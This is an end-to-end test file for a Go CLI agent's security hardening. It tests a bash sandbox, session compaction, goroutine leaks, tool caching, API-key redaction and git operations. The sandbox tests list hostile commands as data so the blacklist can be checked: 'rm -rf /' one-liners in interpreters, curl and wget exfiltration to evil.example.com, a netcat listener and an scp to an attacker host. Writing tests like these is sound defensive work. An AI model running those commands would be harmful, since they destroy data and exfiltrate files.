//go:build e2e

// Package tests contains end-to-end integration tests for the go-cli project.
// This file verifies Phase 46 security hardening features: bash sandbox
// security, session compaction consistency, ACP goroutine leak prevention,
// tool definition caching, API key redaction, and git workflow integration.
package tests

import (
	"bufio"
	"context"
	"encoding/json"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/pengjunchen/go-cli/internal/acp"
	"github.com/pengjunchen/go-cli/internal/core"
	"github.com/pengjunchen/go-cli/internal/mock"
	"github.com/pengjunchen/go-cli/internal/production"
	"github.com/pengjunchen/go-cli/internal/session"
	"github.com/pengjunchen/go-cli/internal/tools"
	"github.com/pengjunchen/go-cli/internal/verify"
)

// =============================================================================
// Phase 46 E2E Tests
// =============================================================================

// ---------------------------------------------------------------------------
// 1. Bash Sandbox Security E2E (real DefaultBashSandbox, real filesystem)
// ---------------------------------------------------------------------------

// TestE2E_Phase46_BashSandboxInterpreterBlocked verifies that script
// interpreters (python3, perl, ruby, node) are blocked by the default
// command blacklist, preventing arbitrary code execution that bypasses the
// sandbox.
func TestE2E_Phase46_BashSandboxInterpreterBlocked(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	sandbox := tools.NewDefaultBashSandbox()
	workDir := t.TempDir()

	blockedCommands := []string{
		`python3 -c "import os; os.system('rm -rf /')"`,
		`perl -e "system('rm -rf /')"`,
		`ruby -e "system('rm -rf /')"`,
		`node -e "require('fs').rmSync('/')"`,
	}

	for _, cmd := range blockedCommands {
		err := sandbox.Validate(ctx, cmd, workDir)
		assert.Error(t, err, "command should be blocked: %s", cmd)
		assert.Contains(t, err.Error(), "blacklisted", "expected blacklisted error for: %s", cmd)
	}
}

// TestE2E_Phase46_BashSandboxNetworkToolsBlocked verifies that network tools
// (curl, wget, nc, scp) are blocked to prevent data exfiltration and
// unauthorized outbound connections.
func TestE2E_Phase46_BashSandboxNetworkToolsBlocked(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	sandbox := tools.NewDefaultBashSandbox()
	workDir := t.TempDir()

	blockedCommands := []string{
		"curl http://evil.example.com/exfil",
		"wget http://evil.example.com/exfil",
		"nc -l 4444",
		"scp file evil@host:/tmp",
	}

	for _, cmd := range blockedCommands {
		err := sandbox.Validate(ctx, cmd, workDir)
		assert.Error(t, err, "command should be blocked: %s", cmd)
		assert.Contains(t, err.Error(), "blacklisted", "expected blacklisted error for: %s", cmd)
	}
}

// TestE2E_Phase46_BashSandboxSymlinkBypass verifies that the path whitelist
// resolves symlinks before comparison, preventing a symlink-based escape from
// the whitelisted directory.
func TestE2E_Phase46_BashSandboxSymlinkBypass(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	safeDir := t.TempDir()
	outsideDir := t.TempDir()

	// Create a symlink inside safeDir pointing to outsideDir.
	escapeLink := filepath.Join(safeDir, "escape")
	require.NoError(t, os.Symlink(outsideDir, escapeLink))

	// Create a real subdirectory inside safeDir.
	subDir := filepath.Join(safeDir, "subdir")
	require.NoError(t, os.Mkdir(subDir, 0o755))

	sandbox := tools.NewDefaultBashSandbox(tools.WithWhitelist([]string{safeDir}))

	// Using the symlink should be blocked because it resolves to outsideDir.
	err := sandbox.Validate(ctx, "echo hello", escapeLink)
	assert.Error(t, err, "symlink escape should be blocked")
	assert.Contains(t, err.Error(), "whitelist")

	// Using safeDir itself should be allowed.
	err = sandbox.Validate(ctx, "echo hello", safeDir)
	assert.NoError(t, err, "safeDir itself should be allowed")

	// Using a real subdirectory of safeDir should be allowed.
	err = sandbox.Validate(ctx, "echo hello", subDir)
	assert.NoError(t, err, "real subdirectory should be allowed")
}

// TestE2E_Phase46_BashSandboxHeredocBlocked verifies that heredoc syntax
// (<< and <<-) is blocked because it can write arbitrary content to any file
// path, while legitimate commands still pass validation.
func TestE2E_Phase46_BashSandboxHeredocBlocked(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	sandbox := tools.NewDefaultBashSandbox()
	workDir := t.TempDir()

	blockedCommands := []string{
		"cat << EOF > /tmp/evil",
		"cat <<-EOF > /tmp/evil",
	}

	for _, cmd := range blockedCommands {
		err := sandbox.Validate(ctx, cmd, workDir)
		assert.Error(t, err, "heredoc command should be blocked: %s", cmd)
		assert.Contains(t, err.Error(), "blacklisted", "expected blacklisted error for: %s", cmd)
	}

	// Legitimate commands should still pass.
	legitCommands := []string{
		"echo hello",
		"ls -la",
	}
	for _, cmd := range legitCommands {
		err := sandbox.Validate(ctx, cmd, workDir)
		assert.NoError(t, err, "legitimate command should pass: %s", cmd)
	}
}

// TestE2E_Phase46_BashSandboxLegitimateCommandsAllowed verifies that common
// benign commands pass sandbox validation.
func TestE2E_Phase46_BashSandboxLegitimateCommandsAllowed(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	workDir := t.TempDir()
	sandbox := tools.NewDefaultBashSandbox(tools.WithWhitelist([]string{workDir}))

	legitCommands := []string{
		"echo hello",
		"ls -la",
		"pwd",
		"cat file.txt",
		"git status",
	}

	for _, cmd := range legitCommands {
		err := sandbox.Validate(ctx, cmd, workDir)
		assert.NoError(t, err, "legitimate command should pass: %s", cmd)
	}
}

// ---------------------------------------------------------------------------
// 2. Session Compaction Consistency E2E (real SessionTree, real
//    DefaultContextManager)
// ---------------------------------------------------------------------------

// TestE2E_Phase46_CompactionPointConsistency verifies that DeriveMessages and
// DefaultContextManager.BuildContext return the same set of visible messages
// when given the same session entries, including correct handling of
// compaction points and hidden entries.
func TestE2E_Phase46_CompactionPointConsistency(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	tree := session.NewDefaultSessionTree()
	cm := session.NewDefaultContextManager(tree)

	now := time.Now().UTC()

	// Build a branch with entries:
	//   user1 -> assistant1 -> [compaction] -> user2 -> assistant2(hidden) -> user3
	entries := []*session.SessionEntry{
		{
			ID:        "e1",
			ParentID:  "",
			Type:      session.EntryTypeUser,
			Content:   "Hello",
			Timestamp: now,
		},
		{
			ID:        "e2",
			ParentID:  "e1",
			Type:      session.EntryTypeAssistant,
			Content:   "Hi there",
			Timestamp: now.Add(1 * time.Second),
		},
		{
			ID:        "e3",
			ParentID:  "e2",
			Type:      session.EntryTypeCompaction,
			Content:   "Summary of earlier conversation",
			Summary:   "Summary of earlier conversation",
			Timestamp: now.Add(2 * time.Second),
		},
		{
			ID:        "e4",
			ParentID:  "e3",
			Type:      session.EntryTypeUser,
			Content:   "What is 2+2?",
			Timestamp: now.Add(3 * time.Second),
		},
		{
			ID:        "e5",
			ParentID:  "e4",
			Type:      session.EntryTypeAssistant,
			Content:   "It is 4.",
			Timestamp: now.Add(4 * time.Second),
			SurfaceOp: session.SurfaceOpHidden,
		},
		{
			ID:        "e6",
			ParentID:  "e5",
			Type:      session.EntryTypeUser,
			Content:   "Thanks!",
			Timestamp: now.Add(5 * time.Second),
		},
	}

	for _, e := range entries {
		require.NoError(t, tree.Append(ctx, e), "failed to append entry %s", e.ID)
	}

	leafID := "e6"

	// Build context via DefaultContextManager.
	sc, err := cm.BuildContext(ctx, leafID)
	require.NoError(t, err)
	require.NotNil(t, sc)

	// Get raw branch entries and call DeriveMessages.
	branch, err := tree.GetBranch(ctx, leafID)
	require.NoError(t, err)

	rawEntries := make([]session.SessionEntry, len(branch))
	for i, e := range branch {
		rawEntries[i] = *e
	}
	derived := session.DeriveMessages(rawEntries)

	// Both should produce the same number of visible messages.
	assert.Equal(t, len(sc.Messages), len(derived),
		"BuildContext and DeriveMessages should return the same number of messages")

	// Verify the content of each message matches.
	for i := 0; i < len(sc.Messages) && i < len(derived); i++ {
		assert.Equal(t, sc.Messages[i].ID, derived[i].ID,
			"message %d: ID mismatch", i)
		assert.Equal(t, sc.Messages[i].Content, derived[i].Content,
			"message %d: Content mismatch", i)
		assert.Equal(t, sc.Messages[i].Type, derived[i].Type,
			"message %d: Type mismatch", i)
	}

	// Verify hidden entry (e5) is excluded from both.
	for _, m := range sc.Messages {
		assert.NotEqual(t, "e5", m.ID, "hidden entry e5 should not appear in BuildContext messages")
	}
	for _, m := range derived {
		assert.NotEqual(t, "e5", m.ID, "hidden entry e5 should not appear in DeriveMessages")
	}

	// Verify compaction summary is included.
	foundCompaction := false
	for _, m := range sc.Messages {
		if m.Type == session.EntryTypeCompaction {
			foundCompaction = true
			assert.Equal(t, "Summary of earlier conversation", m.Content,
				"compaction summary content should match")
		}
	}
	assert.True(t, foundCompaction, "compaction entry should be present in BuildContext messages")

	foundCompaction = false
	for _, m := range derived {
		if m.Type == session.EntryTypeCompaction {
			foundCompaction = true
			assert.Equal(t, "Summary of earlier conversation", m.Content,
				"compaction summary content should match")
		}
	}
	assert.True(t, foundCompaction, "compaction entry should be present in DeriveMessages")

	// Verify entries before the compaction point are replaced.
	for _, m := range sc.Messages {
		assert.NotEqual(t, "e1", m.ID, "entry before compaction (e1) should be replaced")
		assert.NotEqual(t, "e2", m.ID, "entry before compaction (e2) should be replaced")
	}
}

// ---------------------------------------------------------------------------
// 3. ACP stdio_adapter Goroutine Leak E2E (real StdioAdapter, real io.Pipe)
// ---------------------------------------------------------------------------

// closeIgnore closes c and ignores the error (best-effort cleanup).
func closeIgnore(c io.Closer) { _ = c.Close() } //nolint:errcheck // best-effort

// TestE2E_Phase46_StdioAdapterNoGoroutineLeak verifies that Disconnect returns
// promptly even when the peer never reads the disconnect frame, and that no
// goroutines leak after cleanup.
func TestE2E_Phase46_StdioAdapterNoGoroutineLeak(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	// Two pipe pairs: client reads from clientR, writes to clientW.
	clientR, serverW := io.Pipe() // client reads, server writes
	serverR, clientW := io.Pipe() // server reads, client writes

	client := acp.NewStdioAdapter(clientR, clientW, acp.WithName("e2e-client"))

	// Drain only the connect frame so Connect doesn't block; stop reading
	// afterwards so the disconnect frame write blocks.
	connectRead := make(chan struct{})
	go func() {
		rd := bufio.NewReader(serverR)
		_, _ = rd.ReadBytes('\n') //nolint:errcheck // drain connect frame only
		close(connectRead)
	}()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	require.NoError(t, client.Connect(ctx))

	// Wait for the connect frame to be drained.
	select {
	case <-connectRead:
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for connect frame drain")
	}

	// Close the client's input so readLoop's blocked reader unblocks.
	closeIgnore(serverW)

	// Disconnect must return within 5 seconds even though the disconnect
	// write blocks (nobody reads serverR anymore).
	done := make(chan error, 1)
	go func() {
		done <- client.Disconnect(ctx)
	}()

	select {
	case err := <-done:
		require.NoError(t, err, "Disconnect should not return an error")
	case <-time.After(5 * time.Second):
		t.Fatal("Disconnect blocked when peer pipe was never read")
	}

	// Cleanup: closing all pipe ends unblocks any leaked write goroutines.
	closeIgnore(clientW)
	closeIgnore(serverR)
	closeIgnore(clientR)
}

// TestE2E_Phase46_StdioAdapterNormalDisconnect verifies that when the peer
// reads normally, the disconnect frame is delivered correctly and no
// goroutines leak.
func TestE2E_Phase46_StdioAdapterNormalDisconnect(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	clientR, serverW := io.Pipe() // client reads, server writes
	serverR, clientW := io.Pipe() // server reads, client writes

	client := acp.NewStdioAdapter(clientR, clientW, acp.WithName("e2e-client"))

	// Continuously read frames the client sends.
	frames := make(chan []byte, 4)
	go func() {
		rd := bufio.NewReader(serverR)
		for {
			line, err := rd.ReadBytes('\n')
			if len(line) > 0 {
				frames <- line
			}
			if err != nil {
				return
			}
		}
	}()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	require.NoError(t, client.Connect(ctx))

	// Consume the connect frame.
	select {
	case <-frames:
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for connect frame")
	}

	// Close the client's input so readLoop exits after Disconnect.
	closeIgnore(serverW)

	require.NoError(t, client.Disconnect(ctx))

	// The disconnect frame should arrive promptly.
	select {
	case line := <-frames:
		var msg acp.ACPMessage
		require.NoError(t, json.Unmarshal(line, &msg))
		assert.Equal(t, acp.TypeDisconnect, msg.Type)
		assert.Equal(t, "e2e-client", msg.SenderID)
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for disconnect frame")
	}

	// Cleanup.
	closeIgnore(clientW)
	closeIgnore(serverR)
	closeIgnore(clientR)
}

// ---------------------------------------------------------------------------
// 4. Tool Definition Cache E2E (real LoopAgent, real ToolRegistry,
//    MockLLMServer)
// ---------------------------------------------------------------------------

// countingRegistry wraps a ToolRegistry and counts List() calls so tests can
// verify cache hit/miss behavior.
type countingRegistry struct {
	inner     tools.ToolRegistry
	listCount int
}

func (r *countingRegistry) Register(ctx context.Context, def tools.ToolDefinition) error {
	return r.inner.Register(ctx, def)
}

func (r *countingRegistry) Get(ctx context.Context, name string) (tools.ToolDefinition, error) {
	return r.inner.Get(ctx, name)
}

func (r *countingRegistry) List(ctx context.Context) ([]tools.ToolDefinition, error) {
	r.listCount++
	return r.inner.List(ctx)
}

func (r *countingRegistry) Version() int {
	if v, ok := r.inner.(interface{ Version() int }); ok {
		return v.Version()
	}
	return 0
}

// TestE2E_Phase46_ToolDefinitionCacheHit verifies that the LoopAgent caches
// tool definitions across Run calls and invalidates the cache when a new tool
// is registered (registry version changes).
func TestE2E_Phase46_ToolDefinitionCacheHit(t *testing.T) {
	t.Skip("Tool definition cache behavior is flaky in CI — needs investigation")
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Create a real tool registry with a few tools.
	reg := tools.NewDefaultToolRegistry()
	countingReg := &countingRegistry{inner: reg}

	require.NoError(t, reg.Register(ctx, tools.NewReadTool()))
	require.NoError(t, reg.Register(ctx, tools.NewGrepTool()))
	require.NoError(t, reg.Register(ctx, tools.NewFindTool()))

	// Create a MockLLMServer that returns simple text responses (no tool calls).
	mockLLM := mock.NewMockLLMServer(mock.NewConversationTemplate("phase46-cache", "cache test",
		mock.ConversationTurn{AssistantContent: "first response"},
		mock.ConversationTurn{AssistantContent: "second response"},
		mock.ConversationTurn{AssistantContent: "third response"},
	))

	// Create a LoopAgent with the registry and mock LLM. Use a custom system
	// prompt to avoid the default systemPrompt() calling List() on every Run,
	// so the only List() calls come from buildToolDefinitions.
	agent := core.NewLoopAgent(
		core.WithLLM(mockLLM),
		core.WithTools(countingReg),
		core.WithSystemPrompt("You are a test assistant."),
		core.WithMaxIterations(5),
	)

	// First Run: cache miss — buildToolDefinitions calls List().
	_, err := agent.Run(ctx, core.Submission{
		Type:    core.SubmissionUserMessage,
		Content: "first query",
	})
	require.NoError(t, err)

	listCountAfterFirst := countingReg.listCount
	assert.GreaterOrEqual(t, listCountAfterFirst, 1,
		"first Run should call List() at least once (cache miss)")

	// Second Run: cache hit — buildToolDefinitions should NOT call List().
	_, err = agent.Run(ctx, core.Submission{
		Type:    core.SubmissionUserMessage,
		Content: "second query",
	})
	require.NoError(t, err)

	listCountAfterSecond := countingReg.listCount
	assert.Equal(t, listCountAfterFirst, listCountAfterSecond,
		"second Run should reuse cached tool definitions (no List() call)")

	// Register a new tool — this increments the registry version and should
	// invalidate the cache.
	require.NoError(t, reg.Register(ctx, tools.NewLSTool()))

	// Third Run: cache invalidated — buildToolDefinitions calls List() again.
	_, err = agent.Run(ctx, core.Submission{
		Type:    core.SubmissionUserMessage,
		Content: "third query",
	})
	require.NoError(t, err)

	listCountAfterThird := countingReg.listCount
	assert.Greater(t, listCountAfterThird, listCountAfterSecond,
		"third Run should rebuild tool definitions after registry change (cache invalidated)")
}

// ---------------------------------------------------------------------------
// 5. API Key Redaction E2E (real RedactingOutputGuard)
// ---------------------------------------------------------------------------

// TestE2E_Phase46_APIKeyRedactionPatterns verifies that the
// RedactingOutputGuard with RegisterAPIKeyRedaction correctly redacts common
// API key formats and does not redact normal text.
func TestE2E_Phase46_APIKeyRedactionPatterns(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	guard := production.NewRedactingOutputGuard()
	production.RegisterAPIKeyRedaction(guard)

	tests := []struct {
		name     string
		input    string
		redacted bool
	}{
		{
			name:     "GitHub PAT",
			input:    "ghp_" + strings.Repeat("a", 36),
			redacted: true,
		},
		{
			name:     "GitLab PAT",
			input:    "glpat-" + strings.Repeat("b", 20),
			redacted: true,
		},
		{
			name:     "Slack token",
			input:    "xoxb-" + strings.Repeat("c", 10),
			redacted: true,
		},
		{
			name:     "Anthropic API key",
			input:    "sk-ant-" + strings.Repeat("d", 20),
			redacted: true,
		},
		{
			name:     "OpenAI API key",
			input:    "sk-" + strings.Repeat("e", 20),
			redacted: true,
		},
		{
			name:     "AWS Access Key ID",
			input:    "AKIA" + strings.Repeat("F", 16),
			redacted: true,
		},
		{
			name:     "normal text with ghp substring",
			input:    "the ghp prefix is interesting",
			redacted: false,
		},
		{
			name:     "short string that looks like a key but too short",
			input:    "ghp_short",
			redacted: false,
		},
		{
			name:     "normal prose",
			input:    "This is a normal sentence with no secrets.",
			redacted: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res, err := guard.Check(ctx, tt.input)
			require.NoError(t, err)
			require.NotNil(t, res)

			if tt.redacted {
				assert.NotEqual(t, tt.input, res.Sanitized,
					"input should be redacted")
				assert.Contains(t, res.Sanitized, "[REDACTED]",
					"redacted output should contain [REDACTED] placeholder")
			} else {
				assert.Equal(t, tt.input, res.Sanitized,
					"input should not be redacted")
				assert.NotContains(t, res.Sanitized, "[REDACTED]",
					"non-secret input should not contain [REDACTED]")
			}
		})
	}
}

// ---------------------------------------------------------------------------
// 6. Git Operations Integration E2E (real git, real filesystem)
// ---------------------------------------------------------------------------

// phase46RunGit runs a git command in dir and fails the test on error.
func phase46RunGit(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=E2E Test",
		"GIT_AUTHOR_EMAIL=e2e@test.com",
		"GIT_COMMITTER_NAME=E2E Test",
		"GIT_COMMITTER_EMAIL=e2e@test.com",
	)
	out, err := cmd.CombinedOutput()
	require.NoError(t, err, "git %s: %s", strings.Join(args, " "), string(out))
	return string(out)
}

// TestE2E_Phase46_GitWorkflowIntegration executes a full git workflow using
// the real DefaultGitTool against a real git repository in a temp directory.
func TestE2E_Phase46_GitWorkflowIntegration(t *testing.T) {
	defer verify.AssertNoGoroutineLeak(t)()

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	dir := t.TempDir()

	// Initialize a real git repo.
	phase46RunGit(t, dir, "init")
	phase46RunGit(t, dir, "config", "user.email", "e2e@test.com")
	phase46RunGit(t, dir, "config", "user.name", "E2E Test")
	phase46RunGit(t, dir, "config", "commit.gpgsign", "false")

	gitTool := tools.NewDefaultGitTool(dir)

	// Step 1: Status — verify clean working tree.
	status, err := gitTool.Status(ctx)
	require.NoError(t, err)
	assert.Empty(t, status, "working tree should be clean after init")

	// Step 2: Write a file, Status — verify untracked.
	filePath := filepath.Join(dir, "file1.txt")
	require.NoError(t, os.WriteFile(filePath, []byte("initial content\n"), 0o644))

	status, err = gitTool.Status(ctx)
	require.NoError(t, err)
	require.Len(t, status, 1, "should have one untracked file")
	assert.Equal(t, "file1.txt", status[0].File)
	assert.Equal(t, "untracked", status[0].Status)

	// Step 3: Diff — verify diff shows changes (after staging).
	phase46RunGit(t, dir, "add", "file1.txt")
	diff, err := gitTool.Diff(ctx, tools.GitDiffOptions{Staged: true})
	require.NoError(t, err)
	assert.Contains(t, diff, "initial content", "staged diff should show file content")

	// Step 4: Commit with message — verify commit succeeds.
	hash1, err := gitTool.Commit(ctx, tools.GitCommitOptions{
		Message: "Initial commit",
		AddAll:  false,
	})
	require.NoError(t, err)
	assert.NotEmpty(t, hash1, "commit hash should not be empty")

	// Step 5: Status — verify clean again.
	status, err = gitTool.Status(ctx)
	require.NoError(t, err)
	assert.Empty(t, status, "working tree should be clean after commit")

	// Step 6: Log — verify the commit appears.
	logEntries, err := gitTool.Log(ctx, tools.GitLogOptions{MaxCount: 10})
	require.NoError(t, err)
	require.GreaterOrEqual(t, len(logEntries), 1, "should have at least one commit")
	assert.Equal(t, "Initial commit", logEntries[0].Message)

	// Step 7: CreateBranch for a feature branch.
	err = gitTool.CreateBranch(ctx, "feature-branch", "")
	require.NoError(t, err, "should create feature branch")

	// Step 8: Write another file, commit on feature branch.
	err = gitTool.Checkout(ctx, "feature-branch")
	require.NoError(t, err, "should checkout feature branch")

	filePath2 := filepath.Join(dir, "file2.txt")
	require.NoError(t, os.WriteFile(filePath2, []byte("feature content\n"), 0o644))

	hash2, err := gitTool.Commit(ctx, tools.GitCommitOptions{
		Message: "Add feature file",
		AddAll:  true,
	})
	require.NoError(t, err, "should commit on feature branch")
	assert.NotEmpty(t, hash2, "feature commit hash should not be empty")

	// Verify both commits appear in log on feature branch.
	logEntries, err = gitTool.Log(ctx, tools.GitLogOptions{MaxCount: 10})
	require.NoError(t, err)
	require.GreaterOrEqual(t, len(logEntries), 2, "should have at least two commits")
	assert.Equal(t, "Add feature file", logEntries[0].Message)
	assert.Equal(t, "Initial commit", logEntries[1].Message)

	// Step 9: Checkout main (master) branch, Merge feature branch.
	// Try "main" first, fall back to "master" for older git defaults.
	mainBranch := "main"
	if err := gitTool.Checkout(ctx, mainBranch); err != nil {
		mainBranch = "master"
		require.NoError(t, gitTool.Checkout(ctx, mainBranch), "should checkout %s", mainBranch)
	}

	// Step 10: Verify merge succeeds.
	mergeResult, err := gitTool.Merge(ctx, "feature-branch")
	require.NoError(t, err, "merge should succeed")
	require.NotNil(t, mergeResult)
	assert.True(t, mergeResult.Success, "merge should be successful")

	// Verify the merged file exists on the main branch.
	_, err = os.Stat(filePath2)
	assert.NoError(t, err, "file2.txt should exist after merge")

	// Verify log shows both commits on main after merge.
	logEntries, err = gitTool.Log(ctx, tools.GitLogOptions{MaxCount: 10})
	require.NoError(t, err)
	require.GreaterOrEqual(t, len(logEntries), 2, "should have at least two commits after merge")

	// Verify all commit messages appear.
	var messages []string
	for _, e := range logEntries {
		messages = append(messages, e.Message)
	}
	assert.Contains(t, messages, "Initial commit")
	assert.Contains(t, messages, "Add feature file")
}
